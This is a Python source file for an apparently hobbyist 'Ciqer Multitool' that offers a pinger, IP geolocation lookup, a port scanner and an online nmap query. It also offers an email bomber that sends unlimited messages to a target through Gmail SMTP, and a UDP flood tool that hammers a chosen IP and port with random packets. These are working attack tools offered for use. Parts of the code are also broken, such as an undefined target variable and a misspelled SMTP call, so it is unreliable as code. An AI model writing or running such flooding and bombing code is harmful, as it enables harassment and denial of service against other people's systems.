# Imports

import colorama, datetime, subprocess, hashlib, os, time, json, requests, smtplib, random, socket, threading, sys, concurrent.futures
from colorama import Fore, Back, Style
colorama.init()

def ResetTL():
    while 1:
        Main()
        os.system("pause")

# Variables

IP_Logo = f'''

{Fore.WHITE} ██▓ ██▓███      ██▓     ▒█████   {Fore.GREEN}▒█████   ██ ▄█▀ █    ██  ██▓███  
{Fore.WHITE}▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒▒{Fore.GREEN}██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒
{Fore.WHITE}▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒{Fore.GREEN}██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒
{Fore.WHITE}░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░▒{Fore.GREEN}██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒
{Fore.WHITE}░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░{Fore.GREEN} ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░
{Fore.WHITE}░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░{Fore.GREEN} ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
{Fore.WHITE} ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░  {Fore.GREEN} ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░     
{Fore.WHITE} ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░{Fore.GREEN} ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░       
{Fore.WHITE} ░                  ░  ░    ░ ░   {Fore.GREEN}   ░ ░  ░  ░      ░              
'''

Port_Logo = f'''

{Fore.WHITE} ██▓███   ▒█████   ██▀███  ▄▄▄█████▓     ██████  ▄████▄{Fore.GREEN}   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  
{Fore.WHITE}▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒   ▒██    ▒ ▒██▀ ▀█{Fore.GREEN}  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
{Fore.WHITE}▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░   ░ ▓██▄   ▒▓█    {Fore.GREEN}▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
{Fore.WHITE}▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░      ▒   ██▒▒▓▓▄ ▄█{Fore.GREEN}█▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
{Fore.WHITE}▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░    ▒██████▒▒▒ ▓███▀{Fore.GREEN} ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
{Fore.WHITE}▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░      ▒ ▒▓▒ ▒ ░░ ░▒ ▒ {Fore.GREEN} ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
{Fore.WHITE}░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░       ░ ░▒  ░ ░  ░  ▒ {Fore.GREEN}    ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
{Fore.WHITE}░░       ░ ░ ░ ▒    ░░   ░   ░         ░  ░  ░  ░      {Fore.GREEN}    ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░ 
{Fore.WHITE}             ░ ░     ░                       ░  ░ ░    {Fore.GREEN}        ░  ░         ░          ░    ░  ░   ░     
{Fore.WHITE}                                                ░      {Fore.GREEN}                                                  
'''

Nmap_Logo = f'''

{Fore.WHITE} ███▄    █  ███▄ ▄███{Fore.GREEN}▓ ▄▄▄       ██▓███  
{Fore.WHITE} ██ ▀█   █ ▓██▒▀█▀ ██{Fore.GREEN}▒▒████▄    ▓██░  ██▒
{Fore.WHITE}▓██  ▀█ ██▒▓██    ▓██{Fore.GREEN}░▒██  ▀█▄  ▓██░ ██▓▒
{Fore.WHITE}▓██▒  ▐▌██▒▒██    ▒██{Fore.GREEN} ░██▄▄▄▄██ ▒██▄█▓▒ ▒
{Fore.WHITE}▒██░   ▓██░▒██▒   ░██{Fore.GREEN}▒ ▓█   ▓██▒▒██▒ ░  ░
{Fore.WHITE}░ ▒░   ▒ ▒ ░ ▒░   ░  {Fore.GREEN}░ ▒▒   ▓▒█░▒▓▒░ ░  ░
{Fore.WHITE}░ ░░   ░ ▒░░  ░      {Fore.GREEN}░  ▒   ▒▒ ░░▒ ░     
{Fore.WHITE}   ░   ░ ░ ░      ░  {Fore.GREEN}   ░   ▒   ░░       
{Fore.WHITE}         ░        ░  {Fore.GREEN}       ░  ░         
'''

Main_Logo = f'''

{Fore.WHITE} ██▓███   ██▓ ███▄    {Fore.GREEN}█   ▄████ ▓█████  ██▀███  
{Fore.WHITE}▓██░  ██▒▓██▒ ██ ▀█   {Fore.GREEN}█  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
{Fore.WHITE}▓██░ ██▓▒▒██▒▓██  ▀█ █{Fore.GREEN}█▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
{Fore.WHITE}▒██▄█▓▒ ▒░██░▓██▒  ▐▌█{Fore.GREEN}█▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
{Fore.WHITE}▒██▒ ░  ░░██░▒██░   ▓█{Fore.GREEN}█░░▒▓███▀▒░▒████▒░██▓ ▒██▒
{Fore.WHITE}▒▓▒░ ░  ░░▓  ░ ▒░   ▒ {Fore.GREEN}▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
{Fore.WHITE}░▒ ░      ▒ ░░ ░░   ░ {Fore.GREEN}▒░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
{Fore.WHITE}░░        ▒ ░   ░   ░ {Fore.GREEN}░ ░ ░   ░    ░     ░░   ░ 
          ░           ░       ░   {Fore.GREEN}░  ░   ░     
'''

Dos_Logo = f'''

{Fore.WHITE}▓█████▄  ▒█████    ██████  {Fore.GREEN}  ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
{Fore.WHITE}▒██▀ ██▌▒██▒  ██▒▒██    ▒  {Fore.GREEN}  ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
{Fore.WHITE}░██   █▌▒██░  ██▒░ ▓██▄    {Fore.GREEN}  ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
{Fore.WHITE}░▓█▄   ▌▒██   ██░  ▒   ██▒ {Fore.GREEN}  ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
{Fore.WHITE}░▒████▓ ░ ████▓▒░▒██████▒▒ {Fore.GREEN}    ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
{Fore.WHITE} ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ {Fore.GREEN}    ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
{Fore.WHITE} ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ {Fore.GREEN}      ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
{Fore.WHITE} ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   {Fore.GREEN}    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
{Fore.WHITE}   ░        ░ ░        ░   {Fore.GREEN}               ░ ░      ░ ░      ░  ░
{Fore.WHITE} ░                         {Fore.GREEN}                                     
'''

# Functions

def ipping():
    os.system("cls && title Pinger")
    count = 1
    print(Main_Logo)
    e = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Enter\u001b[38;5;49mIP\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")
    replies = 0
    replies += 1
    hostname = e
    os.system("cls")
    print(Main_Logo)
    while True:
        response = os.system("ping -n 1 " + hostname + " >nul")
        if response == 0:
            print("\033[1;32;40m" + hostname + " ONLINE!" + " [" +  str(count) + "]" +  '\033[0m')
        else:
            print("\033[31m" + hostname + " OFFLINE!" " [" +  str(count) + "]" +  '\033[0m')
        count += 1
        time.sleep(0.1)

def Port_scanner():
    Port_Logo
    the_lock = threading.Lock()
    ip = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Enter\u001b[38;5;49m IP\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")

    def portscanner(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((ip, port))
            s.close()
            with the_lock:
                print(f'{Fore.WHITE} {port} {Fore.GREEN}Open!')
        except:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as x:
        for port in range(1024):
            x.submit(portscanner, ip, port + 1)

def Nmap_Tool():
    os.system('cls && title Nmap')
    api = 'https://api.hackertarget.com/nmap/?q='
    print(Nmap_Logo)
    target = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Tar\u001b[38;5;49mget\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")

    attack = api + target

    req = requests.get(attack)

    nmaptext = req.text

    print("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Tar\u001b[38;5;49mget \u001b[38;5;50mFound\u001b[38;5;51m]═>\u001b[38;5;7m " + str(nmaptext))


def ip_lookup():
    print(IP_Logo)
    ip = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Enter\u001b[38;5;49mIP\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")

    response = requests.get(
        f'http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query')

    data = response.json()

    ipaddress = data['query']
    continett = data['continent']
    countryy = data['country']
    zipcode = data['zip']
    latt = data['lat']
    lonn = data['lon']
    ispp = data['isp']
    orgg = data['org']
    proxyy = data['proxy']
    hostingg = data['hosting']

    print(
        f'IP: {ipaddress}\nContinet: {continett}\nCountry: {countryy}\nZip Code: {zipcode}\nLat: {latt}\nLon: {lonn}\nIsp: {ispp}\nOrg: {orgg}\nProxy: {proxyy}\nHosting: {hostingg}')

# Main

def Main():
    os.system("cls && title Ciqer Multitool")
    print(f'''

{Fore.WHITE} ▄████▄   ██▓  ██{Fore.GREEN}███  ▓█████  ██▀███  
{Fore.WHITE}▒██▀ ▀█  ▓██▒▒██▓{Fore.GREEN}  ██▒▓█   ▀ ▓██ ▒ ██▒
{Fore.WHITE}▒▓█    ▄ ▒██▒▒██▒{Fore.GREEN}  ██░▒███   ▓██ ░▄█ ▒
{Fore.WHITE}▒▓▓▄ ▄██▒░██░░██ {Fore.GREEN} █▀ ░▒▓█  ▄ ▒██▀▀█▄  
{Fore.WHITE}▒ ▓███▀ ░░██░░▒██{Fore.GREEN}█▒█▄ ░▒████▒░██▓ ▒██▒
{Fore.WHITE}░ ░▒ ▒  ░░▓  ░░ ▒{Fore.GREEN}▒░ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
{Fore.WHITE}  ░  ▒    ▒ ░ ░ ▒{Fore.GREEN}░  ░  ░ ░  ░  ░▒ ░ ▒░
{Fore.WHITE}░         ▒ ░   ░{Fore.GREEN}   ░    ░     ░░   ░ 
{Fore.WHITE}░ ░       ░      {Fore.GREEN}░       ░  ░   ░     
{Fore.WHITE}░                {Fore.GREEN}                     

                              {Fore.WHITE}Discord.gg/DtkZ7Xvn
                                 {Fore.GREEN}Apple Edition
   ''')
    print(f'{Fore.WHITE}[1] {Fore.GREEN}Pinger')
    print(f'{Fore.WHITE}[2] {Fore.GREEN}IP Lookup')
    print(f'{Fore.WHITE}[3] {Fore.GREEN}Email Bomber')
    print(f'{Fore.WHITE}[4] {Fore.GREEN}Dos Tool')
    print(f'{Fore.WHITE}[5] {Fore.GREEN}NMap Scanner')
    print(f'{Fore.WHITE}[6] {Fore.GREEN}Port Scanner')

    pick = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Ciq\u001b[38;5;49mer\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")

    if pick == "1":
        ipping()

    elif pick == "2":
        os.system('cls && title IP Lookup')
        ip_lookup()

    elif pick == "5":
        Nmap_Tool()

    elif pick == "6":
        os.system('cls && title Port Scanner')
        print(Port_Logo)
        Port_scanner()

    elif pick == "3":
        pick = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Tar\u001b[38;5;49mget\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")
        messages = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Mess\u001b[38;5;49mages\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")
        mailcount = int(500)
        sendmessages = 0
        port = 587
        myemail = "Enter Email"
        password = "Enter Password"
        try:
            smtp = smtplib.SMTP('smtp.gmail.com', port)
            smtp.ehlc()
            smtp.starttls()
            smtp.ehlo()
            smtp.login(myemail, password)
            while 1:
                smtp.sendmail(myemail, target, messages)
                sendmessages += 1
                print("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[sended\u001b[38;5;49mMessage\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m {}".format(sendmessages))

        except:
            print("Google has stopped the process")

    elif pick == "4":
        os.system('cls && title Dos Tool')
        dos_tool()

def dos_tool():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    os.system('cls')
    print(Dos_Logo)
    print(f'{Fore.WHITE}Welcome to{Fore.GREEN} the Dos Tool')
    print('')
    ip = input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Tar\u001b[38;5;49mget\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m ")
    port = int(input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Enter\u001b[38;5;49m Port\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m "))
    dur = int(input("\u001b[38;5;46m╚\u001b[38;5;47m══\u001b[38;5;48m[Enter\u001b[38;5;49m Duration\u001b[38;5;50m\u001b[38;5;51m]═>\u001b[38;5;7m "))
    timeout = time.time() + dur
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent",sent,"packets to", ip, "through", port,)
        except KeyboardInterrupt:
            sys.exit()

ResetTL()
